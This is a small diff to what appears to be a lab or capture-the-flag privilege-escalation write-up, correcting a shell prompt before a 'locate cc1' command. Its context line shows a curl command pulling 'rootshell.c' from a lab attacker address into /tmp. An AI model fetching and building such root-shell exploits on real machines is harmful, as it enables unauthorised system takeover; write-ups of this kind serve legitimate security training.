@@ -163,7 +163,7 @@ $ curl 10.10.14.8/rootshell.c -o /tmp/rootshell.c
 Then find `cc1`.
 
 ```bash
-$ /tmp $ locate cc1
+$ locate cc1
 /etc/ssl/certs/6fcc125d.0
 /lib/modules/4.4.0-77-generic/kernel/drivers/iio/adc/cc10001_adc.ko
 /lib/modules/4.4.0-78-generic/kernel/drivers/iio/adc/cc10001_adc.ko
